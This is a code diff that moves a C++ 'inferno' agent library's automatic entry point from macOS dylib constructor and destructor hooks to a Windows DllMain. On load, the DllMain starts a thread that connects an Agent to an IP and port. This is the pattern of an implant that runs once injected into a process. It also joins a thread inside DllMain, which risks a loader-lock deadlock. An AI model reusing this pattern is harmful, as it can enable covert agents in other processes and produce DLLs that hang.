@@ -1,10 +1,17 @@
 #include "../include/Agent.hpp"
 #include "../include/entry_dylib.hpp"
 #include "../../common/include/CryptoContext.hpp"
-#include <cerrno>
 #include <cstdlib>
-#include <thread>
+#include <cerrno>
 #include <atomic>
+#include <thread>
+
+#ifdef _WIN32
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+#endif
 
 namespace inferno { namespace agent {
 
@@ -27,20 +34,17 @@ bool isDylibShuttingDown() {
 
 }} // namespace inferno::agent
 
-#if defined(INFERNO_DYLIB) || defined(INFERNO_TESTING)
+#if defined(INFERNO_DLL) || defined(INFERNO_TESTING)
 
-extern "C" int inferno_agent_entry_ran = 0;
+#ifdef _WIN32
+#define EXPORT_SYMBOL __declspec(dllexport)
+#else
+#define EXPORT_SYMBOL
+#endif
 
-__attribute__((destructor))
-static void agent_exit() {
-    inferno::agent::g_shutdown.store(true);
-    if (inferno::agent::g_agent_thread.joinable()) {
-        inferno::agent::g_agent_thread.join();
-    }
-}
+extern "C" EXPORT_SYMBOL int inferno_agent_entry_ran = 0;
 
-__attribute__((constructor))
-static void agent_entry() {
+static void agentThreadFunc() {
     inferno_agent_entry_ran = 1;
 #ifdef INFERNO_TESTING
     inferno::agent::constructorRan() = true;
@@ -61,11 +65,21 @@ static void agent_entry() {
         }
     }
 
-    inferno::agent::g_agent_thread = std::thread([ip, port]() {
-        inferno::Agent agent(ip, port);
-        agent.run();
-    });
+    inferno::Agent agent(ip, port);
+    agent.run();
 #endif
+}
+
+BOOL WINAPI DllMain(HINSTANCE, DWORD fdwReason, LPVOID) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        inferno::agent::g_agent_thread = std::thread(agentThreadFunc);
+    } else if (fdwReason == DLL_PROCESS_DETACH) {
+        inferno::agent::g_shutdown.store(true);
+        if (inferno::agent::g_agent_thread.joinable()) {
+            inferno::agent::g_agent_thread.join();
+        }
+    }
+    return TRUE;
 }
 
 #endif
